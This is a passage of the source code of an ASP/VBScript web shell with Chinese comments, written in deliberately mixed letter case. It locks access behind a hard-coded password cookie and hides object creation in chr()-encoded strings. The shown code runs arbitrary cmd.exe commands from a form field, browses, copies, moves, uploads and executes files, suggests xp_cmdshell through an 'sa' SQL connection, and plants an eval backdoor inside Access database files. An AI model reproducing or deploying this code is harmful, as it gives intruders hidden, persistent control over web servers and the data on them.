FOr i=0 tO ObjRs.FiElDs.COunt-1
REspOnsE.writE"<tD><b>"&ObjRS.FiElDs(i).namE&"</b></tD>"
NExt
REspOnsE.writE "</tr>"
iF Objrs.EOF thEn
%>
<%ElsE
DO WhilE NOT ObjRS.EOF
REspOnsE.writE "<tr>"
%>
<%
FOr i=0 tO ObjRs.FiElDs.COunt-1
REspOnsE.writE"<tD>"
IF IsNull(ObjRs.FiElDs(i).valuE) Or ObjRs.FiElDs(i).valuE="" Or ObjRs.FiElDs(i).valuE=" " thEn
rEspOnsE.writE "&nbsp;"
ElsE
  REspOnsE.writE SErvEr.HTMLEncODE(ObjRs.FiElDs(i).valuE)
 EnD iF
REspOnsE.writE"</tD>"
NExt
REspOnsE.writE"</tr>"
ObjRS.MOvENExt
j=j+1
LOOp
EnD iF
sEt ObjRs = nOthing
EnD iF
EnD iF
sEt ObjTablERS = nOthing
ObjCOnn.ClOsE
sEt ObjCOnn = nOthing
%>
  </tablE>
<br>
<%iF rEquEst("cmD")<>"" thEn rEspOnsE.WritE("ÃüÁîÖ´ÐÐ³É¹¦£¬·µ»Ø <FOnt cOlOr=""#FF0000"">"&j&"</FOnt> Ìõ¼ÇÂ¼")%>
  </tablE>
<%
REspOnsE.EnD
EnD iF
%>
<%
url= REquEst.SErvErVariablEs("URL")
iF trim(rEquEst.FOrm("passwOrD"))<>"" anD trim(rEquEst.FOrm("passwOrD"))<>"ÃÜÂë2" thEn call Out()
iF trim(rEquEst.FOrm("passwOrD"))="ÃÜÂë2" thEn
rEspOnsE.cOOkiEs("passwOrD")="allEn"
rEspOnsE.rEDirEct ""&url&""
ElsE iF REquEst.COOkiEs("passwOrD")<>"allEn" thEn
call lOgin() 'ÃÜÂë´íÎó
rEspOnsE.EnD 'Í£Ö¹ÔËÐÐ
EnD iF
sElEct casE rEquEst("iD")
casE "EDit"
call EDit()
casE "uplOaD"
call uplOaD()
casE "Dir"
call Dir()
casE "DOwn"
call DOwnlOaDFilE(rEquEst("path"))
casE "injEct"
call injEct()
casE ElsE
call main()
EnD sElEct
EnD iF
sub lOgin()
FOr i=0 tO 25
On ErrOr rEsumE nExt
IsObj=FalsE
VErObj=""
Dim TEstObj
dim ascstr10
ascstr10=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(84)&chr(69)&chr(115)&chr(116)&chr(79)&chr(98)&chr(106)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(79)&chr(98)&chr(106)&chr(84)&chr(79)&chr(116)&chr(69)&chr(115)&chr(116)&chr(40)&chr(105)&chr(44)&chr(48)&chr(41)&chr(41)
excute ascstr10
IF -2147221005 <> Err thEn
IsObj = TruE
VErObj = TEstObj.vErsiOn
iF VErObj="" Or isnull(VErObj) thEn VErObj=TEstObj.abOut
EnD iF
ObjTOtEst(i,2)=IsObj
ObjTOtEst(i,3)=VErObj
nExt
%>


<cEntEr>
<tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 class="nObOrDEr">
<tr><tD>
<tablE bOrDEr=0 wiDth=100% cEllspacing=1 cEllpaDDing=0 class="nObOrDEr" >
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD wiDth="59%" align=lEFt>nbsp;·þÎñÆ÷Ãû</tD>
<tD wiDth="41%" bgcOlOr="#EEEEEE">nbsp;<%=REquEst.SErvErVariablEs("SERVER_NAME")%></tD>
</tr>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD align=lEFt>nbsp;·þÎñÆ÷IP</tD>
<tD>nbsp;<%=REquEst.SErvErVariablEs("LOCAL_ADDR")%></tD>
</tr>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD align=lEFt>nbsp;·þÎñÆ÷Ê±¼ä</tD>
<tD>nbsp;<%=nOw%></tD>
</tr>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD align=lEFt>nbsp;±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶</tD>
<tD>nbsp;<%=sErvEr.mappath(REquEst.SErvErVariablEs("SCRIPT_NAME"))%></tD>
</tr>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD align=lEFt>&nbsp;·þÎñÆ÷²Ù×÷ÏµÍ³</tD>
<tD>&nbsp;<%=REquEst.SErvErVariablEs("OS")%></tD>
</tr>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><%
Dim t1,t2,lsabc,thEtimE
t1=timEr
FOr i=1 tO 500000
lsabc= 1 + 1
nExt
t2=timEr
thEtimE=cstr(int(( (t2-t1)*10000 )+0.5)/10)
%><tD align=lEFt>&nbsp·þÎñÆ÷ÔËËãËÙ¶È²âÊÔ</tD>
<tD>&nbsp;<FOnt cOlOr=rED><%=thEtimE%> ºÁÃë</FOnt></tD>
</tr>
</tablE><cEntEr><br>
<script languagE="JavaScript">
FunctiOn OpEnwin() {
var nEwwin=winDOw.OpEn("","nEwwin","tOp=0,lEFt=0,tOOlbar=nO,lOcatiOn=nO,DirEctOriEs=nO,status=nO,mEnubar=nO,scrOllbars=yEs,rEsizablE=yEs,wiDth=700,hEight=600");
DOcumEnt.FOrm9.actiOn="";
DOcumEnt.FOrm9.submit();
rEturn truE;}
</script>
<script languagE="JavaScript">
FunctiOn char() {
alErt("ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈë±ùºüÀË×ÓµÄºóÃÅ,Ä¬ÈÏÃÜÂëÊÇ#\n³É¹¦µÄÇ°ÌáÊÇÊý¾Ý¿âÊÇaspºó×º£¬²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\n");
winDOw.OpEn("<%=url%>?DbnamE="+FOrm9.DbnamE.valuE);
sElF.clOsE();
rEturn truE;}
</script>
<FOrm  actiOn="<%=url%>"  namE=FOrm9 targEt="nEwwin" mEthOD="GET">
<tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 class="nObOrDEr">
  <tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD>&nbspmDb+sqlÊý¾Ý¿â²Ù×÷:</tD>
<tD>
<input typE=hiDDEn namE=Op valuE="Db">
<input typE=tExt namE=DbnamE valuE="PrOviDEr=SQLOLEDB.1;PErsist SEcurity InFO=FalsE;SErvEr=127.0.0.1;UsEr ID=sa;PasswOrD=lcx;DatabasE=bbs;" sizE ="40"> <input typE="buttOn" valuE="Ìá½»" Onclick="OpEnwin()"> <input typE="buttOn" valuE="²åÈë" Onclick="char()"> <input typE="buttOn" valuE="ÌáÊ¾" Onclick="prOmpt('²åÈëÖ»Õë¶ÔACESS²Ù×÷','ä¯ÀÀACESS,ÒªÐ´ÈëMDBµÄ¾ø¶ÔÂ·¾¶£¬ÈçD:bbs.mDb;¸ü¸Ä±íµ¥ÖÐ¶ÔÓ¦µÄMSSQL×Ö·û´®¾Í¿ÉÒÔ²Ù×÷sql¿âÁË')"></tD></tr></tablE></FOrm>
<%' -------------------ÔÚACESSÊý¾Ý¿âÀïÐ´ÈëaspºóÃÅ¿ªÊ¼-----------------------
DBDrivEr = "PrOviDEr=MicrOsOFt.JEt.OLEDB.4.0;Data SOurcE="
DbnamE=rEquEst("DbnamE")
dim ascstr11
ascstr11=chr(20)&chr(83)&chr(69)&chr(116)&chr(32)&chr(79)&chr(98)&chr(106)&chr(67)&chr(79)&chr(110)&chr(110)&chr(32)&chr(61)&chr(32)&chr(83)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(67)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(65)&chr(68)&chr(79)&chr(68)&chr(66)&chr(46)&chr(67)&chr(79)&chr(110)&chr(110)&chr(69)&chr(99)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr11
ObjCOnn.COnnEctiOnString = DBDrivEr & DbnamE
ObjCOnn.OpEn
ObjCOnn.ExEcutE("crEatE tablE nOtDOwnlOaDlcx(nOtDOwnlOaDlcx OlEObjEct)")
dim ascstr12
ascstr12=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(114)&chr(115)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(97)&chr(68)&chr(79)&chr(68)&chr(98)&chr(46)&chr(114)&chr(69)&chr(99)&chr(79)&chr(114)&chr(68)&chr(115)&chr(69)&chr(116)&chr(34)&chr(41)
excute ascstr12
 sql="sElEct * FrOm nOtDOwnlOaDlcx"
 rs.OpEn sql,ObjCOnn,1,3
 rs.aDDnEw
 rs("nOtDOwnlOaDlcx").appEnDchunk(chrB(asc("<")) & chrB(asc("s")) & chrB(asc("c"))& chrB(asc("r")) & chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(" "))& chrB(asc("r"))& chrB(asc("u"))& chrB(asc("n"))& chrB(asc("a"))& chrB(asc("t"))& chrB(asc("="))& chrB(asc("s"))& chrB(asc("E"))& chrB(asc("r"))& chrB(asc("v"))& chrB(asc("E"))& chrB(asc("r"))& chrB(asc(" "))& chrB(asc("l"))& chrB(asc("a"))& chrB(asc("n"))& chrB(asc("g"))& chrB(asc("u"))& chrB(asc("a"))& chrB(asc("g"))& chrB(asc("E"))& chrB(asc("="))& chrB(asc("j"))& chrB(asc("a"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">"))& chrB(asc("E"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("l"))& chrB(asc("("))& chrB(asc("r"))& chrB(asc("E"))& chrB(asc("q"))& chrB(asc("u"))& chrB(asc("E"))& chrB(asc("s"))& chrB(asc("t"))& chrB(asc("."))& chrB(asc("F"))& chrB(asc("O"))& chrB(asc("r"))& chrB(asc("m"))& chrB(asc("("))& chrB(asc("'"))& chrB(asc("#"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("+"))& chrB(asc("'"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("<"))& chrB(asc("/"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">")))
 rs.upDatE
 rs.clOsE
sEt rs=nOthing
ObjCOnn.clOsE
sEt ObjCOnn=nOthing
'-----------------------------------------------------Êý¾Ý¿â²Ù×÷½áÊø------------------------------------
'---------------------ÃâFsO´úÂëÐ´ÎÄ¼þ¿ªÊ¼Õë¶ÔÖÐÎÄ-----------------------------------
pathlcx=trim(REquEst.FOrm("pathlcx"))
tExtlcx=trim(REquEst.FOrm("tExtlcx"))
iF tExtlcx<>"" anD pathlcx<>"" thEn
tExtlcx=rEplacE(tExtlcx,">","^>")
tExtlcx=rEplacE(tExtlcx,"<","^<")
tExtlcx=rEplacE(tExtlcx,"&","^&")
tExtlcx=rEplacE(tExtlcx,chr(34),"^"&chr(34))
tExtlcx=rEplacE(tExtlcx,chr(10),"^"&chr(10))
tExtlcx=rEplacE(tExtlcx,chr(13),"^"&chr(13))
dim ascstr13
ascstr13=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(46)&chr(97)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)
excute ascstr13
sEt shEllFOlDEr=shEll.namEspacE("C:\DOcumEnts anD SEttings\DEFault UsEr\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\¸½¼þ")
sEt shEllFOlDEritEm=shEllFOlDEr.parsEnamE("¼ÇÊÂ±¾.lnk")
sEt ObjshElllink =shEllFOlDEritEm.gEtlink
ObjshElllink.path="cmD.ExE"
ObjshElllink.argumEnts="/c EchO "&tExtlcx&">"&pathlcx&" &&DEl c:\a.lnk"
ObjshElllink.savE("c:\a.lnk")
shEll.namEspacE("c:\").itEms.itEm("a.lnk").invOkEvErb
EnD iF
'--------------ÃâFsO´úÂëÐ´ÎÄ¼þ½áÊø-----------ÃâFsO±íµ¥¿ªÊ¼-------------%>
<tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 class="nObOrDEr"><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr" stylE='tablE-layOut:FixED; wOrD-brEak:brEak-all'><tD align=lEFt>
<FOrm actiOn="<%= REquEst.SErvErVariablEs("URL") %>" mEthOD="pOst">
<input typE=tExt namE=tExt valuE="<%=DSnXA %>">  <FOnt class=FOnts>ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼,×îºóÒª¼Ó\</FOnt></tD></tr><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt>
<input typE=tExt namE=tExt1 valuE="<%=DSnXA1 %>">
cOpy
<input typE=tExt namE=tExt2 valuE="<%=DSnXA2 %>"> <FOnt class=FOnts>Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</FOnt></tD></tr><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt>
<input typE=tExt namE=tExt3 valuE="<%=DSnXA3 %>">
mOvE
<input typE=tExt namE=tExt4 valuE="<%=DSnXA4 %>"><FOnt class=FOnts> Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</FOnt></tD></tr><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt>
Â·¾¶£º<input typE=tExt namE=tExt5 valuE="<%=DSnXA5 %>" >
³ÌÐò£º<input typE=tExt namE=tExt6 valuE="<%=DSnXA6 %>" ><FOnt class=FOnts> ²»¿ÉÒÔ¼Ó²ÎÊý</FOnt></tD></tr><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt><input typE="tExt" namE="Ok" sizE=55><FOnt class=FOnts> CMDÃüÁî¶Ô»°¿ò</FOnt>
</tD></tr><tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt><input typE=tExt namE=pathlcx sizE=55><FOnt class=FOnts> Â·¾¶ÓëÎÄ¼þÃû</FOnt></tD><tr/>
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD align=lEFt>
<tExtarEa  cOls=80 rOws=5 namE=tExtlcx >
ÒªÉú³ÉµÄÎÄ¼þÄÚÈÝ£¬²»¿ÉÒÔÓÐ»Ø³µ£º
<% Ok=REquEst("Ok")
rEspOnsE.writE OScriptlhn.ExEc ("cmD.ExE /c "& Ok).stDOut.rEaDall
%></tExtarEa>
<input typE=submit namE=sb valuE=·¢ËÍÃüÁî class=input>
</FOrm></tD></tr><%'-------------ÃâFsO±íµ¥µ¥´úÂë½áÊø------------%>
<script languagE=vbs>
sub main()
basE=DOcumEnt.all.tExt9.valuE
IF IsNumEric(basE) ThEn
cc=hEx(cstr(basE))
alErt("10½øÖÆÎª"&basE)
alErt("16½øÖÆÎª"&cc)
Exit sub
EnD iF
aa=asc(cstr(basE))
bb=hEx(aa)
alErt("10½øÖÆÎª"&aa)
alErt("16½øÖÆÎª"&bb)
EnD sub
sub main2()
IF DOcumEnt.all.vars.valuE<>"" ThEn
'¶¨ÒåÏà¹Ø±äÁ¿
Dim nums,tmp,tmpstr,i
nums=DOcumEnt.all.vars.valuE'È¡µÃ´ÓÓÃ»§¶ËÊäÈë½øÀ´µÄ16½øÖÆÊýÖµ
nums_lEn=LEn(nums)  'µÃ³önumsµÄ³¤¶È
'¿ªÊ¼Ñ»·£¬´ÎÊýÎªnumsµÄ³¤¶ÈÖµ
FOr i=1 TO nums_lEn
 tmp=MiD(nums,i,1) 'È¡³önumsµÄµÚ1¸ö×Ö·û´æ·Åµ½ÁÙÊ±±äÁ¿tmpÖÐ
 IF IsNumEric(tmp) ThEn 'Èç¹ûtmpÖÐµÄÄÚÈÝÊÇÊýÖµÐÍ£¬ÔòÖ´ÐÐÏÂÃæ´úÂë
  tmp=tmp * 16 * (16^(nums_lEn-i-1)) '´ËÎª16½øÖÆÊýÖµÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
 ElsE
  'ÏÞÖÆÊäÈëµÄ16½øÖÆÊýµÄ·¶Î§ÔÚ0--9¼°a--FÖ®¼ä
  IF ASC(UCasE(tmp))<65 Or ASC(UCasE(tmp))>70 ThEn
alErt("ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«FÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£")
Exit sub
  EnD IF
  tmp=(ASC(UCasE(tmp))-55) * (16^(nums_lEn-i)) '´ËÎª16½øÖÆ×Ö·û´®ÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
 EnD IF
  '½«ÉÏÃæ×ª»¯ºóµÄÊýÖµÓëtmpstrÏà¼ÓÀÛ¼Æ³ö×ÜºÍ
  tmpstr=tmpstr+tmp
NExt
alErt("×ª»»µÄ10½øÖÆÎª:"&tmpstr&"Æä×Ö·ûÖµÎª:"&chr(tmpstr))
EnD IF
EnD sub
</script>
<input typE=tExt namE=tExt1 valuE=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ sizE=30 iD=tExt9><input typE=submit Onclick=main() valuE="¸øÎÒ×ª">
<input typE="tExt" namE="vars" valuE=16½øÖÆ×ª10½øÖÆºÍ×Ö·û sizE=30 iD=vars><input typE=submit Onclick=main2() valuE="¸øÎÒ×ª"></tablE>
</cEntEr>
<br><tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 bgcOlOr="#B8B8B8" class="nObOrDEr">
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<FOrm  actiOn=""  mEthOD="pOst">
<Input TYPE="TEXT" NAME="SQL" valuE="<%=strSQL%>" sizE ="30">
  <Input TYPE="TEXT" NAME="strcOn" valuE="PrOviDEr=SQLOLEDB.1;PErsist SEcurity InFO=FalsE;SErvEr=SQL·þÎñÆ÷ip;UsErID=ÓÃ»§Ãû;PasswOrD=ÃÜÂë;" sizE=30 >
<input TYPE="SUBMIT" valuE="sqlÀ©Õ¹">&nbsp
<input typE="buttOn"valuE="ÌáÊ¾" OnClick="prOmpt('¿ÉÒÔÖ´ÐÐmssqlÀ©Õ¹,¾ÙÀý:ExEc mastEr.DbO.xp_cmDshEll ÃüÁîÓï¾ä','¸ü¸Ä±íµ¥×Ö·û´®ÖÐµÄÏàÓ¦ÖµºóÔÙ½øÐÐ²Ù×÷')" >
</FOrm></tr></tablE><br><tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 bgcOlOr="#B8B8B8" class="nObOrDEr">
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr"><tD>
<FOrm namE="FOrm11" mEthOD="pOst" actiOn=<%=FilEnamE%>?up=yEs EnctypE="multipart/FOrm-Data">
ÒÑÓÐÎïÀíÄ¿Â¼+ÎÄ¼þÃû:
<input namE="FilEpath" valuE="D:\tEst.asp" sizE="16">
 ÎÄ¼þµØÖ·:
<input namE="FilE1" typE="FilE"  sizE="13">
<input typE="submit" namE="Submit" valuE=" ÉÏ´«">
 </FOrm></tD></Tr></tablE>
</cEntEr>
<%'-----------------ÃâFsO´úÂëshEll.applicatiOn¿ªÊ¼------------------
DSnXA = REquEst.FOrm("tExt")'Ä¿Â¼ä¯ÀÀ
iF (DSnXA <> "")  thEn
dim ascstr14
ascstr14=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(46)&chr(97)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)&chr(32)&chr(39)&chr(189)&chr(168)&chr(193)&chr(162)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(182)&chr(212)&chr(207)&chr(243)
excute ascstr14
sEt FOD1=shEll.namEspacE(DSnXA)
sEt FODitEms=FOD1.itEms
FOr Each cO in FODitEms
rEspOnsE.writE "<FOnt cOlOr=black>" & cO.path & "-----" & cO.sizE & "</FOnt><br>"
nExt
EnD iF
%>
<%
DSnXA1 = REquEst.FOrm("tExt1")  'Ä¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´
DSnXA2 = REquEst.FOrm("tExt2")
iF DSnXA1<>"" anD DSnXA2<>"" thEn
dim ascstr15
ascstr15=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(49)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(46)&chr(97)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)&chr(32)&chr(39)&chr(189)&chr(168)&chr(193)&chr(162)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(182)&chr(212)&chr(207)&chr(243)
excute ascstr15
sEt FOD1=shEll1.namEspacE(DSnXA2)
FOr i=lEn(DSnXA1) tO 1 stEp -1
iF miD(DSnXA1,i,1)="\" thEn
path=lEFt(DSnXA1,i-1)
Exit FOr
EnD iF
nExt
iF lEn(path)=2 thEn path=path & "\"
path2=right(DSnXA1,lEn(DSnXA1)-i)
sEt FOD2=shEll1.namEspacE(path)
sEt FODitEm=FOD2.parsEnamE(path2)
FOD1.cOpyhErE FODitEm
rEspOnsE.writE "cOmmanD cOmplEtED succEss!"
EnD iF
%>
<%
DSnXA3 = REquEst.FOrm("tExt3")'Ä¿Â¼ÒÆ¶¯
DSnXA4 = REquEst.FOrm("tExt4")
iF DSnXA3<>"" anD DSnXA4<>"" thEn
dim ascstr16
ascstr16=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(50)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(46)&chr(97)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)&chr(32)&chr(39)&chr(189)&chr(168)&chr(193)&chr(162)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(182)&chr(212)&chr(207)&chr(243)
excute ascstr16
sEt FOD1=shEll2.namEspacE(DSnXA4)
FOr i=lEn(DSnXA3) tO 1 stEp -1
iF miD(DSnXA3,i,1)="\" thEn
path=lEFt(DSnXA3,i-1)
Exit FOr
EnD iF
nExt
iF lEn(path)=2 thEn path=path & "\"
path2=right(DSnXA3,lEn(DSnXA3)-i)
sEt FOD2=shEll2.namEspacE(path)
sEt FODitEm=FOD2.parsEnamE(path2)
FOD1.mOvEhErE FODitEm
rEspOnsE.writE "cOmmanD cOmplEtED succEss!"
EnD iF
%>
<%
DSnXA5 = REquEst.FOrm("tExt5") 'Ö´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶
DSnXA6 = REquEst.FOrm("tExt6")
iF DSnXA5<>"" anD DSnXA6<>"" thEn
dim ascstr17
ascstr17=chr(20)&chr(115)&chr(69)&chr(116)&chr(32)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(51)&chr(61)&chr(115)&chr(69)&chr(114)&chr(118)&chr(69)&chr(114)&chr(46)&chr(99)&chr(114)&chr(69)&chr(97)&chr(116)&chr(69)&chr(79)&chr(98)&chr(106)&chr(69)&chr(99)&chr(116)&chr(40)&chr(34)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(46)&chr(97)&chr(112)&chr(112)&chr(108)&chr(105)&chr(99)&chr(97)&chr(116)&chr(105)&chr(79)&chr(110)&chr(34)&chr(41)&chr(32)&chr(39)&chr(189)&chr(168)&chr(193)&chr(162)&chr(115)&chr(104)&chr(69)&chr(108)&chr(108)&chr(182)&chr(212)&chr(207)&chr(243)
excute ascstr17
shEll3.namEspacE(DSnXA5).itEms.itEm(DSnXA6).invOkEvErb
rEspOnsE.writE "cOmmanD cOmplEtED succEss!"
EnD iF
%>
<br><br>
<cEntEr><tablE bOrDEr=0 wiDth=500 cEllspacing=0 cEllpaDDing=0 bgcOlOr="#B8B8B8" class="nObOrDEr">
<tr bgcOlOr="#EEEEEE" hEight=18 class="nObOrDEr">
<tD cOlspan=2 align=cEntEr><FOrm mEthOD="POST" actiOn=""&url&"">
EntEr PasswOrD£º<input typE="passwOrD" namE="passwOrD" sizE="20">
<input typE="submit" valuE="LOGIN"></tD>
</tr>
</FOrm></tD></tr></tablE>
</cEntEr>
</bODy>
<%EnD sub%>
<% EnD iF %>
<%sub main()'---------------------ÃâFsO´úÂë½áÊø£¬FsO´úÂë¿ªÊ¼---------------------
urlpath=REquEst.SErvErVariablEs("SERVER_NAME")
Dim cpath,lpath
iF REquEst("path")="" thEn
lpath="/"
ElsE
lpath=REquEst("path")&"/"
EnD iF
iF REquEst("attrib")="truE" thEn
cpath=lpath
attrib="truE"
ElsE
cpath=SErvEr.MapPath(lpath)
attrib=""
EnD iF
%><html>
<script languagE="JavaScript">
FunctiOn crFilE(ls)
{iF (ls==""){alErt("ÇëÊäÈëÎÄ¼þÃû!");}
ElsE {winDOw.OpEn("<%=url%>?iD=EDit&attrib=<%=rEquEst("attrib")%>&crEat=yEs&path=<%=lpath%>"+ls);}
rEturn FalsE;
}
FunctiOn crDir(ls)
{iF (ls==""){alErt("ÇëÊäÈëÎÄ¼þÃû!");}
ElsE {winDOw.OpEn("<%=url%>?iD=Dir&attrib=<%=rEquEst("attrib")%>&Op=crEat&path=<%=lpath%>"+ls);}
rEturn FalsE;
}
</script>
<script languagE="vbscript">
sub rmDir(ls)
iF cOnFirm("ÄãÕæµÄÒªÉ¾³ýÕâ¸öÄ¿Â¼Âð!"&Chr(13)&Chr(10)&"Ä¿Â¼Îª£º"&ls)thEn
winDOw.OpEn("<%=url%>?iD=Dir&path="&ls&"&Op=DEl&attrib=<%=rEquEst("attrib")%>")
EnD iF
EnD sub
sub cOpyFilE(sFilE)
DFilE=InputBOx(""&Chr(13)&Chr(10)&"Ô´ÎÄ¼þ£º"&sFilE&Chr(13)&Chr(10)&"ÇëÊäÈëÄ¿±êÎÄ¼þµÄÎÄ¼þÃû:"&Chr(13)&Chr(10)&"Ðí´øÂ·¾¶,Òª¸ù¾ÝÄãµÄµ±Ç°Â·¾¶Ä£Ê½. ×¢Òâ:¾ø¶ÔÂ·¾¶Ê¾Àýc:/»òc:\¶¼¿ÉÒÔ")
DFilE=trim(DFilE)
attrib="<%=rEquEst("attrib")%>"
iF DFilE<>"" thEn
iF InStr(DFilE,":") Or InStr(DFilE,"/")=1 thEn
lp=""
iF InStr(DFilE,":") anD attrib<>"truE" thEn
alErt "¶Ô²»Æð£¬ÄãÔÚÏà¶ÔÂ·¾¶Ä£Ê½ÏÂ²»ÄÜÊ¹ÓÃ¾ø¶ÔÂ·¾¶"&Chr(13)&Chr(10)&"´íÎóÂ·¾¶£º["&DFilE&"]"
Exit sub
EnD iF
ElsE
lp="<%=lpath%>"
EnD iF
winDOw.OpEn(""&url&"?iD=EDit&path="+sFilE+"&Op=cOpy&attrib="+attrib+"&Dpath="+lp+DFilE)
ElsE
alErt"ÄúÃ»ÓÐÊäÈëÎÄ¼þÃû£¡"
EnD IF
EnD sub
</script><bODy bgcOlOr="#F5F5F5">
<TABLE cEllSpacing=1 cEllPaDDing=3 wiDth="750" align=cEntEr
bgCOlOr=#b8b8b8 bOrDEr=0 class="nObOrDEr">
<TBODY>
<TR >
<TD
hEight=22 cOlspan="4" bgcOlOr="#EEEEEE" >ÇÐ»»ÅÌ·û£º
<%
FOr Each thing in ObjFsOlhn.DrivEs
